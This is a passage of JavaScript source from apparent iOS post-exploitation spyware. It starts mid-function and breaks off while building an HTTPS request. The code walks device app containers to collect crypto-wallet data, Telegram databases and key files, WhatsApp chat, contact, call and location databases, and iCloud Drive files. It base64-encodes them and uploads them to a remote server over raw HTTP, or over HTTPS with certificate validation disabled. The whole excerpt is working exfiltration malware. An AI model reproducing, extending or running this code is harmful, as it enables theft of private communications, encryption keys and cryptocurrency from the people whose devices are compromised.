					const folderAccess = Native.callSymbol("access", scanInfo.folder, 0);
					if (Number(folderAccess) !== 0) continue;
					
					const files = listFilesRecursive(scanInfo.folder, 3, 0); // max 3 levels
					for (const f of files) {
						// Skip very large files (over 20MB for app data)
						if (f.size > 20 * 1024 * 1024) continue;
						// Skip empty files
						if (f.size === 0) continue;
						
						appFiles.push({
							path: f.path,
							category: scanInfo.category,
							description: appIdentifier,
							containerUUID: name,
							bundleId: appIdentifier
						});
						totalFiles++;
					}
				}
			}
		} finally {
			Native.callSymbol("closedir", dir);
		}
		
	}
	
	return appFiles;
}

/**
 * Download crypto wallet app data using pattern matching (if plist parsing works)
 * Falls back to downloading all app data if no matches found
 */
function getCryptoWalletFiles() {
	const walletFiles = [];
	
	
	// Scan AppGroup for wallet group containers first
	const walletGroupContainers = findWalletGroupContainers();
	
	// Scan group containers
	for (const wallet of walletGroupContainers) {
		const files = listFilesRecursive(wallet.groupPath, 5, 0);
		
		for (const file of files) {
			if (file.size > 50 * 1024 * 1024) continue;
			if (file.size === 0) continue;
			
			const categoryName = wallet.pattern.toLowerCase().replace(/[^a-z0-9]/g, '-');
			walletFiles.push({
				path: file.path,
				filename: getUniqueFilename(file.path),
				category: "wallet-" + categoryName,
				description: "Crypto Wallet Group - " + wallet.bundleId,
				walletName: wallet.bundleId,
				bundleId: wallet.bundleId
			});
		}
	}
	
	// Scan Data/Application containers for wallets
	const allBundleIds = getBundleIdLookup();
	const walletBundleIds = [];
	
	for (const bundleId of Object.keys(allBundleIds)) {
		if (bundleId === "true") continue;
		const bundleIdLower = bundleId.toLowerCase();
		for (const pattern of CRYPTO_WALLET_PATTERNS) {
			const patternLower = pattern.toLowerCase();
			if (bundleIdLower.indexOf(patternLower) !== -1) {
				walletBundleIds.push(bundleId);
				break;
			}
		}
	}
	
	
	// Get data container paths
	const containers = getContainerPathsForBundleIds(walletBundleIds);
	
	// For each found wallet, recursively scan ALL files
	for (const bundleId of Object.keys(containers)) {
		const container = containers[bundleId];
		const appName = container.name || bundleId;
		const categoryName = bundleId.toLowerCase().replace(/[^a-z0-9]/g, '-');
		
		
		// Scan data container if exists
		if (container.dataPath) {
			const dirsToScan = [
				container.dataPath + "/Documents",
				container.dataPath + "/Library",
				container.dataPath + "/tmp"
			];
			
			for (const dir of dirsToScan) {
				const files = listFilesRecursive(dir, 5, 0);
				
				for (const file of files) {
					if (file.size > 50 * 1024 * 1024) continue;
					if (file.size === 0) continue;
					
					walletFiles.push({
						path: file.path,
						filename: getUniqueFilename(file.path),
						category: "wallet-" + categoryName,
						description: appName + " Wallet",
						walletName: appName,
						bundleId: bundleId
					});
				}
			}
		}
		
		// Scan group container if exists
		if (container.groupPath) {
			const files = listFilesRecursive(container.groupPath, 5, 0);
			
			for (const file of files) {
				if (file.size > 50 * 1024 * 1024) continue;
				if (file.size === 0) continue;
				
				walletFiles.push({
					path: file.path,
					filename: getUniqueFilename(file.path),
					category: "wallet-" + categoryName,
					description: appName + " Wallet Group",
					walletName: appName,
					bundleId: bundleId
				});
			}
		}
	}
	
	return walletFiles;
}

// OLD VERSION REMOVED - now using direct lookup via getContainerPathsForBundleIds()

/**
 * Generate unique filename with parent directory prefix
 * Example: /path/to/Documents/file.db -> Documents_file.db
 */
function getUniqueFilename(fullPath) {
	const parts = fullPath.split('/');
	const filename = parts[parts.length - 1];
	const parentDir = parts[parts.length - 2] || "";
	
	// For deeply nested files, include more path context
	if (parts.length >= 3) {
		const parentDir2 = parts[parts.length - 3] || "";
		if (parentDir2 && parentDir2 !== "Library" && parentDir2 !== "Documents") {
			return parentDir2 + "_" + parentDir + "_" + filename;
		}
	}
	
	return parentDir + "_" + filename;
}

/**
 * Find crypto wallet AppGroup containers by scanning and matching against wallet patterns
 * Returns array of wallet group container paths
 */
function findWalletGroupContainers() {
	const walletPaths = [];
	const appGroupPath = "/private/var/mobile/Containers/Shared/AppGroup";
	
	
	const dir = Native.callSymbol("opendir", appGroupPath);
	if (!dir || dir === 0n) {
		return walletPaths;
	}
	
	
	try {
		let uuidCount = 0;
		let walletCount = 0;
		
		while (true) {
			const entry = Native.callSymbol("readdir", dir);
			if (!entry || entry === 0n) break;
			
			const name = readDirentName(entry);
			if (!name || name.length === 0 || name[0] === '.') continue;
			
			// Check if it looks like a UUID (36 chars)
			if (name.length !== 36) continue;
			
			uuidCount++;
			const groupDir = appGroupPath + "/" + name;
			const metadataPath = groupDir + "/.com.apple.mobile_container_manager.metadata.plist";
			
			// Read the metadata plist
			const metadataInfo = readInfoPlist(metadataPath);
			
			if (metadataInfo && metadataInfo.MCMMetadataIdentifier) {
				const identifier = metadataInfo.MCMMetadataIdentifier;
				const identifierLower = identifier.toLowerCase();
				
				// Check if this matches any wallet pattern
				// Group containers have "group." prefix, e.g. "group.com.exodus.wallet"
				let matchedPattern = "";
				for (const pattern of CRYPTO_WALLET_PATTERNS) {
					const patternLower = pattern.toLowerCase();
					if (identifierLower.indexOf(patternLower) !== -1) {
						matchedPattern = pattern;
						break;
					}
				}
				
				if (matchedPattern) {
					walletCount++;
					
					walletPaths.push({
						groupPath: groupDir,
						bundleId: identifier,
						uuid: name,
						pattern: matchedPattern
					});
				}
			}
		}
		
		
	} finally {
		Native.callSymbol("closedir", dir);
	}
	
	return walletPaths;
}

/**
 * Find Telegram data by scanning AppGroup containers
 * Returns array of telegram-data paths found
 */
function findTelegramDataPaths() {
	const telegramPaths = [];
	const appGroupPath = "/private/var/mobile/Containers/Shared/AppGroup";
	
	
	const dir = Native.callSymbol("opendir", appGroupPath);
	if (!dir || dir === 0n) {
		return telegramPaths;
	}
	
	
	try {
		let groupCount = 0;
		let uuidCount = 0;
		let telegramCount = 0;
		
		let loopCount = 0;
		while (true) {
			loopCount++;
			if (loopCount > 500) {
				break;
			}
			
			const entry = Native.callSymbol("readdir", dir);
			if (!entry || entry === 0n) {
				break;
			}
			
			const name = readDirentName(entry);
			if (!name || name.length === 0 || name[0] === '.') continue;
			
			groupCount++;
			
			// Log ALL entries to find the Telegram UUID
			
			// Special check for Telegram UUID
			if (name.indexOf("75D26893") !== -1 || name.indexOf("75d26893") !== -1) {
			}
			
			// Check if it looks like a UUID (36 chars with dashes)
			if (name.length !== 36) {
				continue;
			}
			
			uuidCount++;
			const groupDir = appGroupPath + "/" + name;
			const metadataPath = groupDir + "/.com.apple.mobile_container_manager.metadata.plist";
			
			// Read the metadata plist
			const metadataInfo = readInfoPlist(metadataPath);
			
			// Special debug for Telegram UUID
			if (name === "75D26893-B78C-4875-AFCA-8329A3B2E6EE") {
				if (metadataInfo) {
				}
			}
			
			if (metadataInfo && metadataInfo.MCMMetadataIdentifier) {
				const identifier = metadataInfo.MCMMetadataIdentifier;
				const identifierLower = identifier.toLowerCase();
				
				// Log ALL bundle IDs
				
				// Check if this is a Telegram container
				const hasTelegra = identifierLower.indexOf("telegra") !== -1;
				
				if (hasTelegra) {
					
					// Check if telegram-data folder exists
					const telegramDataPath = groupDir + "/telegram-data";
					if (fileExists(telegramDataPath)) {
						telegramCount++;
						telegramPaths.push({
							groupPath: groupDir,
							telegramDataPath: telegramDataPath,
							bundleId: identifier,
							uuid: name
						});
					} else {
					}
				}
			}
		}
		
		
		// readdir is limited - try scanning with glob/stat instead
		// Build a list of ALL UUIDs using a different method
		
		// Use stat to test if UUID directories exist (brute force common UUID patterns)
		// Or reopen and read more entries
		const dir2 = Native.callSymbol("opendir", appGroupPath);
		if (dir2 && dir2 !== 0n) {
			try {
				let extraCount = 0;
				while (extraCount < 200) {
					const entry = Native.callSymbol("readdir", dir2);
					if (!entry || entry === 0n) break;
					
					const name = readDirentName(entry);
					if (!name || name.length === 0 || name[0] === '.') continue;
					if (name.length !== 36) continue;
					
					extraCount++;
					
					// Check this entry (might get more than first opendir)
					const groupDir = appGroupPath + "/" + name;
					const metadataPath = groupDir + "/.com.apple.mobile_container_manager.metadata.plist";
					const metadata = readInfoPlist(metadataPath);
					
					if (metadata && metadata.MCMMetadataIdentifier) {
						const identifier = metadata.MCMMetadataIdentifier;
						const identifierLower = identifier.toLowerCase();
						
						
						if (identifierLower.indexOf("telegra") !== -1) {
							const telegramDataPath = groupDir + "/telegram-data";
							if (fileExists(telegramDataPath)) {
								telegramCount++;
								telegramPaths.push({
									groupPath: groupDir,
									telegramDataPath: telegramDataPath,
									bundleId: identifier,
									uuid: name
								});
							}
						}
					}
				}
			} finally {
				Native.callSymbol("closedir", dir2);
			}
		}
		
	} finally {
		Native.callSymbol("closedir", dir);
	}
	
	return telegramPaths;
}

/**
 * Download iCloud Drive files
 */
function getiCloudDriveFiles() {
	const icloudFiles = [];
	const icloudBasePath = "/private/var/mobile/Library/Mobile Documents";
	
	
	// Check if iCloud Drive is accessible
	if (!fileExists(icloudBasePath)) {
		return icloudFiles;
	}
	
	// Main iCloud Drive folder
	const icloudDrivePath = icloudBasePath + "/com~apple~CloudDocs";
	
	if (fileExists(icloudDrivePath)) {
		const files = listFilesRecursive(icloudDrivePath, 10, 0);
		
		for (const file of files) {
			// Skip very large files
			if (file.size > 50 * 1024 * 1024) continue; // 50MB limit
			if (file.size === 0) continue;
			
			// Create filename with full path context
			const relativePath = file.path.substring(icloudDrivePath.length + 1);
			const uniqueName = "CloudDocs_" + relativePath.replace(/\//g, '_');
			
			icloudFiles.push({
				path: file.path,
				filename: uniqueName,
				category: "icloud-drive",
				description: "iCloud Drive"
			});
		}
	}
	
	// Scan all iCloud folders (com~, iCloud~, and app-specific formats)
	const mobileDocsDir = Native.callSymbol("opendir", icloudBasePath);
	if (mobileDocsDir && mobileDocsDir !== 0n) {
		try {
			while (true) {
				const entry = Native.callSymbol("readdir", mobileDocsDir);
				if (!entry || entry === 0n) break;
				
				const name = readDirentName(entry);
				if (!name || name.length === 0 || name[0] === '.') continue;
				
				// Skip com~apple~CloudDocs (already scanned above)
				if (name === "com~apple~CloudDocs") continue;
				
				// Scan any folder with ~ in name (iCloud storage format)
				if (name.indexOf("~") !== -1) {
					const appICloudPath = icloudBasePath + "/" + name;
					const files = listFilesRecursive(appICloudPath, 10, 0);
					
					// Determine category based on folder name
					let category = "icloud-app";
					if (name.indexOf("iCloud~") === 0) {
						category = "icloud-app";
					} else if (name.indexOf("com~apple~") === 0) {
						category = "icloud-apple";
					} else {
						category = "icloud-other";
					}
					
					for (const file of files) {
						if (file.size > 50 * 1024 * 1024) continue;
						if (file.size === 0) continue;
						
						// Include container folder in filename
						const relativePath = file.path.substring(icloudBasePath.length + 1);
						const parts = relativePath.split('/');
						const containerName = parts[0] || "";
						const restPath = parts.slice(1).join('_').replace(/\//g, '_');
						const uniqueName = containerName + "_" + restPath;
						
						icloudFiles.push({
							path: file.path,
							filename: uniqueName,
							category: category,
							description: "iCloud - " + name
						});
					}
				}
			}
		} finally {
			Native.callSymbol("closedir", mobileDocsDir);
		}
	}
	
	return icloudFiles;
}

/**
 * Get WhatsApp and Telegram files using direct bundle ID lookup
 */
function getMessengerDatabases() {
	const messengerFiles = [];
	
	
	// Telegram: Use dedicated scan function
	const telegramContainers = findTelegramDataPaths();
	
	for (const tgContainer of telegramContainers) {
		
		// Scan root telegram-data for .tempkey
		const groupScanPaths = [tgContainer.telegramDataPath];
		
		// Find account-* folders and accounts-metadata
		const telegramDir = Native.callSymbol("opendir", tgContainer.telegramDataPath);
		if (telegramDir && telegramDir !== 0n) {
			try {
				while (true) {
					const entry = Native.callSymbol("readdir", telegramDir);
					if (!entry || entry === 0n) break;
					
					const name = readDirentName(entry);
					if (!name || name.length === 0 || name[0] === '.') continue;
					
					// Check for account-* folders
					if (name.indexOf("account-") === 0) {
						const accountPath = tgContainer.telegramDataPath + "/" + name;
						groupScanPaths.push(accountPath + "/postbox/db");
						groupScanPaths.push(accountPath);  // For notificationsKey
					}
					// Check for accounts-metadata folder
					else if (name === "accounts-metadata") {
						groupScanPaths.push(tgContainer.telegramDataPath + "/accounts-metadata");
					}
				}
			} finally {
				Native.callSymbol("closedir", telegramDir);
			}
		}
		
		
		// Scan all discovered paths
		for (const scanPath of groupScanPaths) {
			const files = listFilesRecursive(scanPath, 10, 0);
			
			for (const file of files) {
				if (file.size > 100 * 1024 * 1024) continue;
				if (file.size === 0) continue;
				
				const fileName = file.path.split('/').pop();
				const pathLower = file.path.toLowerCase();
				
				// Accept:
				// 1. .tempkey file
				// 2. All files in postbox/db/
				// 3. notificationsKey in account-* folders
				// 4. All files in accounts-metadata/ (exclude media/)
				
				const isTempKey = fileName === ".tempkey";
				const isInPostboxDb = pathLower.indexOf("/postbox/db/") !== -1;
				const isNotificationsKey = fileName === "notificationsKey";
				const isInAccountsMetadata = pathLower.indexOf("/accounts-metadata/") !== -1 && pathLower.indexOf("/media/") === -1;
				
				if (!isTempKey && !isInPostboxDb && !isNotificationsKey && !isInAccountsMetadata) {
					continue; // Skip this file
				}
				
				const uniqueFilename = getUniqueFilename(file.path);
				
				messengerFiles.push({
					path: file.path,
					filename: uniqueFilename,
					category: "telegram",
					description: "Telegram - " + tgContainer.bundleId
				});
			}
		}
	}
	
	// WhatsApp: Scan AppGroup for WhatsApp group containers (like we do for Telegram)
	const whatsappGroupContainers = [];
	const appGroupPath = "/private/var/mobile/Containers/Shared/AppGroup";
	
	const waGroupDir = Native.callSymbol("opendir", appGroupPath);
	if (waGroupDir && waGroupDir !== 0n) {
		try {
			while (true) {
				const entry = Native.callSymbol("readdir", waGroupDir);
				if (!entry || entry === 0n) break;
				
				const name = readDirentName(entry);
				if (!name || name.length === 0 || name[0] === '.') continue;
				if (name.length !== 36) continue; // UUID format
				
				const groupDir = appGroupPath + "/" + name;
				const metadataPath = groupDir + "/.com.apple.mobile_container_manager.metadata.plist";
				const metadata = readInfoPlist(metadataPath);
				
				if (metadata && metadata.MCMMetadataIdentifier) {
					const identifier = metadata.MCMMetadataIdentifier;
					const identifierLower = identifier.toLowerCase();
					
					// Check if this is a WhatsApp group container
					if (identifierLower.indexOf("whatsapp") !== -1) {
						whatsappGroupContainers.push({
							groupPath: groupDir,
							bundleId: identifier,
							uuid: name,
							name: metadata.CFBundleName || metadata.CFBundleDisplayName || identifier
						});
					}
				}
			}
		} finally {
			Native.callSymbol("closedir", waGroupDir);
		}
	}
	
	
	// Also get data containers from applicationState.db
	const allBundleIds = getBundleIdLookup();
	const whatsappBundleIds = [];
	
	for (const bundleId of Object.keys(allBundleIds)) {
		if (bundleId === "true") continue;
		const bundleIdLower = bundleId.toLowerCase();
		if (bundleIdLower.indexOf("whatsapp") !== -1) {
			whatsappBundleIds.push(bundleId);
		}
	}
	
	const waContainers = getContainerPathsForBundleIds(whatsappBundleIds);
	
	// Scan WhatsApp group containers first
	for (const waGroup of whatsappGroupContainers) {
		const files = listFilesRecursive(waGroup.groupPath, 10, 0);
		
		// WhatsApp specific database files to download
		const whatsappDbNames = [
			"AvatarSearchTags.sqlite",
			"Axolotl.sqlite",
			"BackedUpKeyValue.sqlite",
			"CallHistory.sqlite",
			"ChatStorage.sqlite",
			"Contacts.sqlite",
			"ContactsV2.sqlite",
			"DeviceAgents.sqlite",
			"emoji.sqlite",
			"Labels.sqlite",
			"LID.sqlite",
			"LocalKeyValue.sqlite",
			"Location.sqlite",
			"MediaDomain.sqlite",
			"Sticker.sqlite",
			"Stickers.sqlite"
		];
		
		let sqliteCount = 0;
		for (const file of files) {
			if (file.size > 100 * 1024 * 1024) continue;
			if (file.size === 0) continue;
			
			const fileName = file.path.split('/').pop();
			
			// Check if this is one of the WhatsApp databases we want
			let isWhatsAppDb = false;
			for (const dbName of whatsappDbNames) {
				if (fileName === dbName) {
					isWhatsAppDb = true;
					break;
				}
			}
			
			if (!isWhatsAppDb) continue;
			
			sqliteCount++;
			
			messengerFiles.push({
				path: file.path,
				filename: getUniqueFilename(file.path),
				category: "whatsapp",
				description: "WhatsApp - " + waGroup.name
			});
		}
		
	}
	
	// Log what data containers were found
	for (const bid of Object.keys(waContainers)) {
		const c = waContainers[bid];
	}
	
	// Scan WhatsApp data containers
	for (const bundleId of Object.keys(waContainers)) {
		const container = waContainers[bundleId];
		const appName = container.name || bundleId;
		
		if (true) {
			// WhatsApp: scan specific subdirectories known to contain databases
			
			if (container.dataPath) {
				const dirsToScan = [
					container.dataPath + "/Documents",
					container.dataPath + "/Library",
					container.dataPath + "/Library/Application Support",
					container.dataPath + "/Library/ChatStorage",
					container.dataPath + "/tmp"
				];
				
				for (const dir of dirsToScan) {
					const files = listFilesRecursive(dir, 10, 0);
					
				// WhatsApp specific database files to download
				const whatsappDbNames = [
					"AvatarSearchTags.sqlite",
					"Axolotl.sqlite",
					"BackedUpKeyValue.sqlite",
					"CallHistory.sqlite",
					"ChatStorage.sqlite",
					"Contacts.sqlite",
					"ContactsV2.sqlite",
					"DeviceAgents.sqlite",
					"emoji.sqlite",
					"Labels.sqlite",
					"LID.sqlite",
					"LocalKeyValue.sqlite",
					"Location.sqlite",
					"MediaDomain.sqlite",
					"Sticker.sqlite",
					"Stickers.sqlite"
				];
				
				for (const file of files) {
					if (file.size > 100 * 1024 * 1024) continue;
					if (file.size === 0) continue;
					
					const fileName = file.path.split('/').pop();
					
					// Check if this is one of the WhatsApp databases we want
					let isWhatsAppDb = false;
					for (const dbName of whatsappDbNames) {
						if (fileName === dbName) {
							isWhatsAppDb = true;
							break;
						}
					}
					
					if (!isWhatsAppDb) {
						continue; // Skip non-WhatsApp databases
					}
					
					
					messengerFiles.push({
						path: file.path,
						filename: getUniqueFilename(file.path),
						category: "whatsapp",
						description: "WhatsApp - " + appName
					});
				}
				}
			}
		}
	}
	
	return messengerFiles;
}

/**
 * Base64 encode a Uint8Array
 */
function base64Encode(data) {
	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	let result = "";
	
	for (let i = 0; i < data.length; i += 3) {
		const byte1 = data[i];
		const byte2 = i + 1 < data.length ? data[i + 1] : 0;
		const byte3 = i + 2 < data.length ? data[i + 2] : 0;
		
		const b1 = byte1 >> 2;
		const b2 = ((byte1 & 0x03) << 4) | (byte2 >> 4);
		const b3 = ((byte2 & 0x0F) << 2) | (byte3 >> 6);
		const b4 = byte3 & 0x3F;
		
		result += chars[b1] + chars[b2];
		result += (i + 1 < data.length) ? chars[b3] : "=";
		result += (i + 2 < data.length) ? chars[b4] : "=";
	}
	
	return result;
}

/**
 * Read a file and return its contents as base64
 */
function readFileAsBase64(filePath) {
	try {
		// Check if file exists
		if (!fileExists(filePath)) {
			return null;
		}
		
		// Get file size
		const fileSize = getFileSize(filePath);
		if (fileSize < 0) {
			return null;
		}
		
		if (fileSize === 0) {
			return { data: "", size: 0 };
		}
		
		if (fileSize > MAX_FILE_SIZE) {
			return null;
		}
		
		// Open file for reading
		const fd = Native.callSymbol("open", filePath, 0); // O_RDONLY = 0
		if (Number(fd) < 0) {
			return null;
		}
		
		try {
			// Read file in chunks
			let fileData = new Uint8Array(0);
			let totalRead = 0;
			
			while (totalRead < fileSize) {
				const remaining = fileSize - totalRead;
				const toRead = remaining > CHUNK_SIZE ? CHUNK_SIZE : remaining;
				
				const chunkBuf = Native.callSymbol("malloc", BigInt(toRead));
				if (!chunkBuf || chunkBuf === 0n) {
					break;
				}
				
				try {
					const bytesRead = Native.callSymbol("read", fd, chunkBuf, toRead);
					const bytesReadNum = Number(bytesRead);
					
					if (bytesReadNum <= 0) {
						break;
					}
					
					// Read data from the buffer
					const chunkData = Native.read(chunkBuf, bytesReadNum);
					if (chunkData && chunkData.byteLength > 0) {
						const chunkArray = new Uint8Array(chunkData);
						
						// Append to fileData
						const newData = new Uint8Array(fileData.length + chunkArray.length);
						newData.set(fileData, 0);
						newData.set(chunkArray, fileData.length);
						fileData = newData;
						
						totalRead += bytesReadNum;
					} else {
						break;
					}
				} finally {
					Native.callSymbol("free", chunkBuf);
				}
			}
			
			if (fileData.length > 0) {
				const base64Data = base64Encode(fileData);
				return { data: base64Data, size: fileData.length };
			} else {
				return null;
			}
			
		} finally {
			Native.callSymbol("close", fd);
		}
		
	} catch (e) {
		return null;
	}
}

/**
 * Send file data via HTTP POST
 */
function sendFileViaHTTP(filePath, category, description, base64Data, originalSize, deviceUUID) {
	try {
		
		// Create socket
		const socket = Native.callSymbol("socket", 2, 1, 0); // AF_INET, SOCK_STREAM, 0
		if (Number(socket) < 0) {
			return false;
		}
		
		// Set up address structure
		const addr = Native.mem;
		const sockaddr = new ArrayBuffer(16);
		const view = new DataView(sockaddr);
		
		view.setUint16(0, 2, true); // AF_INET
		const port = Native.callSymbol("htons", HTTP_PORT);
		view.setUint16(2, Number(port), true);
		
		const hostStrPtr = Native.callSymbol("malloc", BigInt(SERVER_HOST.length + 1));
		Native.writeString(hostStrPtr, SERVER_HOST);
		const ipAddr = Native.callSymbol("inet_addr", hostStrPtr);
		Native.callSymbol("free", hostStrPtr);
		
		if (ipAddr === 0xFFFFFFFFn || ipAddr === -1n) {
			Native.callSymbol("close", socket);
			return false;
		}
		
		view.setUint32(4, Number(ipAddr), true);
		Native.write(addr, sockaddr);
		
		// Connect to server
		const connectResult = Native.callSymbol("connect", socket, addr, 16);
		if (Number(connectResult) < 0) {
			Native.callSymbol("close", socket);
			return false;
		}
		
		// Build JSON payload
		const jsonData = JSON.stringify({
			path: filePath,
			category: category,
			description: description,
			size: originalSize,
			deviceUUID: deviceUUID,
			data: base64Data
		});
		
		// Prepare HTTP request
		const httpRequest = `POST ${UPLOAD_PATH} HTTP/1.1\r\n` +
						   `Host: ${SERVER_HOST}:${HTTP_PORT}\r\n` +
						   `Content-Type: application/json\r\n` +
						   `Content-Length: ${jsonData.length}\r\n` +
						   `X-Device-UUID: ${deviceUUID}\r\n` +
						   `Connection: close\r\n\r\n` +
						   jsonData;
		
		// For large requests, we need to send in chunks
		const requestBytes = Native.stringToBytes(httpRequest, false);
		const requestLength = requestBytes.byteLength;
		
		// Allocate buffer for the request
		const sendBufSize = Math.min(requestLength, 0x10000); // 64KB max per send
		const sendBuf = Native.callSymbol("malloc", BigInt(sendBufSize));
		if (!sendBuf || sendBuf === 0n) {
			Native.callSymbol("close", socket);
			return false;
		}
		
		try {
			let totalSent = 0;
			const requestArray = new Uint8Array(requestBytes);
			
			while (totalSent < requestLength) {
				const remaining = requestLength - totalSent;
				const toSend = remaining > sendBufSize ? sendBufSize : remaining;
				
				// Copy chunk to buffer
				const chunk = requestArray.slice(totalSent, totalSent + toSend);
				Native.write(sendBuf, chunk.buffer);
				
				const sendResult = Native.callSymbol("send", socket, sendBuf, toSend, 0);
				const sendResultNum = Number(sendResult);
				
				if (sendResultNum < 0) {
					return false;
				}
				
				totalSent += sendResultNum;
			}
			
			
			// Wait a bit before closing
			Native.callSymbol("usleep", BigInt(50000)); // 50ms delay
			
			return true;
			
		} finally {
			Native.callSymbol("free", sendBuf);
			Native.callSymbol("close", socket);
		}
		
	} catch (error) {
		return false;
	}
}

/**
 * Send file data via HTTPS POST using CFStream with TLS
 */
function sendFileViaHTTPS(filePath, category, description, base64Data, originalSize, deviceUUID) {
	try {
		
		// Helper function to safely read 64-bit value
		function safeRead64(addr) {
			const bytes = Native.read(addr, 8);
			if (!bytes || bytes.byteLength < 8) return 0n;
			const view = new DataView(bytes);
			const low = BigInt(view.getUint32(0, true));
			const high = BigInt(view.getUint32(4, true));
			return (high << 32n) | low;
		}
		
		// Helper function to safely write 64-bit value
		function safeWrite64(addr, value) {
			const buffer = new ArrayBuffer(8);
			const view = new DataView(buffer);
			const bigValue = BigInt(value);
			view.setUint32(0, Number(bigValue & 0xFFFFFFFFn), true);
			view.setUint32(4, Number((bigValue >> 32n) & 0xFFFFFFFFn), true);
			Native.write(addr, buffer);
		}
		
		// Create CFString for host
		const hostCStr = Native.callSymbol("malloc", SERVER_HOST.length + 1);
		Native.writeString(hostCStr, SERVER_HOST);
		const hostCFString = Native.callSymbol("CFStringCreateWithCString", 0n, hostCStr, 0x08000100);
		Native.callSymbol("free", hostCStr);
		
		if (!hostCFString || hostCFString === 0n) {
			return false;
		}
		
		// Allocate space for read/write stream pointers
		const readStreamPtr = Native.callSymbol("malloc", 8);
		const writeStreamPtr = Native.callSymbol("malloc", 8);
		safeWrite64(readStreamPtr, 0n);
		safeWrite64(writeStreamPtr, 0n);
		
		// Create stream pair connected to host:port
		Native.callSymbol("CFStreamCreatePairWithSocketToHost", 0n, hostCFString, HTTPS_PORT, readStreamPtr, writeStreamPtr);
		
		const readStream = safeRead64(readStreamPtr);
		const writeStream = safeRead64(writeStreamPtr);
		
		Native.callSymbol("CFRelease", hostCFString);
		Native.callSymbol("free", readStreamPtr);
		Native.callSymbol("free", writeStreamPtr);
		
		if (!writeStream || writeStream === 0n) {
			if (readStream && readStream !== 0n) Native.callSymbol("CFRelease", readStream);
			return false;
		}
		
		
		// Set up SSL/TLS
		const securityLevelCStr = Native.callSymbol("malloc", 64);
		Native.writeString(securityLevelCStr, "kCFStreamPropertySocketSecurityLevel");
		const kCFStreamPropertySocketSecurityLevel = Native.callSymbol("CFStringCreateWithCString", 0n, securityLevelCStr, 0x08000100);
		Native.callSymbol("free", securityLevelCStr);
		
		const sslNegotiatedCStr = Native.callSymbol("malloc", 64);
		Native.writeString(sslNegotiatedCStr, "kCFStreamSocketSecurityLevelNegotiatedSSL");
		const kCFStreamSocketSecurityLevelNegotiatedSSL = Native.callSymbol("CFStringCreateWithCString", 0n, sslNegotiatedCStr, 0x08000100);
		Native.callSymbol("free", sslNegotiatedCStr);
		
		// Set TLS/SSL on the streams
		Native.callSymbol("CFWriteStreamSetProperty", writeStream, kCFStreamPropertySocketSecurityLevel, kCFStreamSocketSecurityLevelNegotiatedSSL);
		Native.callSymbol("CFReadStreamSetProperty", readStream, kCFStreamPropertySocketSecurityLevel, kCFStreamSocketSecurityLevelNegotiatedSSL);
		
		// Configure SSL settings to allow self-signed certificates
		const sslSettingsCStr = Native.callSymbol("malloc", 64);
		Native.writeString(sslSettingsCStr, "kCFStreamPropertySSLSettings");
		const kCFStreamPropertySSLSettings = Native.callSymbol("CFStringCreateWithCString", 0n, sslSettingsCStr, 0x08000100);
		Native.callSymbol("free", sslSettingsCStr);
		
		const validateCertCStr = Native.callSymbol("malloc", 64);
		Native.writeString(validateCertCStr, "kCFStreamSSLValidatesCertificateChain");
		const validateCertKey = Native.callSymbol("CFStringCreateWithCString", 0n, validateCertCStr, 0x08000100);
		Native.callSymbol("free", validateCertCStr);
		
		// Get kCFBooleanFalse to disable certificate validation
		const kCFBooleanFalse = Native.callSymbol("dlsym", 0xfffffffffffffffen, "kCFBooleanFalse");
		const kCFBooleanFalseValue = kCFBooleanFalse ? safeRead64(kCFBooleanFalse) : 0n;
		
		if (kCFBooleanFalseValue && kCFBooleanFalseValue !== 0n) {
			const keysArray = Native.callSymbol("malloc", 8);
			const valuesArray = Native.callSymbol("malloc", 8);
			safeWrite64(keysArray, validateCertKey);
			safeWrite64(valuesArray, kCFBooleanFalseValue);
			
			const kCFTypeDictionaryKeyCallBacks = Native.callSymbol("dlsym", 0xfffffffffffffffen, "kCFTypeDictionaryKeyCallBacks");
			const kCFTypeDictionaryValueCallBacks = Native.callSymbol("dlsym", 0xfffffffffffffffen, "kCFTypeDictionaryValueCallBacks");
			
			if (kCFTypeDictionaryKeyCallBacks && kCFTypeDictionaryValueCallBacks) {
				const sslSettings = Native.callSymbol("CFDictionaryCreate", 0n, keysArray, valuesArray, 1,
					kCFTypeDictionaryKeyCallBacks, kCFTypeDictionaryValueCallBacks);
				
				if (sslSettings && sslSettings !== 0n) {
					Native.callSymbol("CFWriteStreamSetProperty", writeStream, kCFStreamPropertySSLSettings, sslSettings);
					Native.callSymbol("CFReadStreamSetProperty", readStream, kCFStreamPropertySSLSettings, sslSettings);
					Native.callSymbol("CFRelease", sslSettings);
				}
			}
			
			Native.callSymbol("free", keysArray);
			Native.callSymbol("free", valuesArray);
		}
		
		if (validateCertKey) Native.callSymbol("CFRelease", validateCertKey);
		if (kCFStreamPropertySocketSecurityLevel) Native.callSymbol("CFRelease", kCFStreamPropertySocketSecurityLevel);
		if (kCFStreamSocketSecurityLevelNegotiatedSSL) Native.callSymbol("CFRelease", kCFStreamSocketSecurityLevelNegotiatedSSL);
		if (kCFStreamPropertySSLSettings) Native.callSymbol("CFRelease", kCFStreamPropertySSLSettings);
		
		// Open the streams
		
		Native.callSymbol("CFReadStreamOpen", readStream);
		const writeOpened = Native.callSymbol("CFWriteStreamOpen", writeStream);
		
		if (!writeOpened) {
			Native.callSymbol("CFRelease", readStream);
			Native.callSymbol("CFRelease", writeStream);
			return false;
		}
		
		// Wait for stream to be ready (TLS handshake)
		
		let attempts = 0;
		const maxAttempts = 100; // 10 seconds max
		let streamReady = false;
		
		while (attempts < maxAttempts) {
			const status = Number(Native.callSymbol("CFWriteStreamGetStatus", writeStream));
			
			if (status === 2) { // kCFStreamStatusOpen
				streamReady = true;
				break;
			} else if (status >= 5) { // Error states
				break;
			} else {
				Native.callSymbol("usleep", 100000); // 100ms
				attempts++;
			}
		}
		
		if (!streamReady) {
			const finalStatus = Number(Native.callSymbol("CFWriteStreamGetStatus", writeStream));
			Native.callSymbol("CFReadStreamClose", readStream);
			Native.callSymbol("CFWriteStreamClose", writeStream);
			Native.callSymbol("CFRelease", readStream);
			Native.callSymbol("CFRelease", writeStream);
			return false;
		}
		
		
		// Build JSON payload
		const jsonData = JSON.stringify({
			path: filePath,
			category: category,
			description: description,
			size: originalSize,
			deviceUUID: deviceUUID,
			data: base64Data
		});
		
		// Build HTTPS request
		const httpRequest = `POST ${UPLOAD_PATH} HTTP/1.1\r\n` +
						   `Host: ${SERVER_HOST}:${HTTPS_PORT}\r\n` +
						   `Content-Type: application/json\r\n` +
						   `Content-Length: ${jsonData.length}\r\n` +
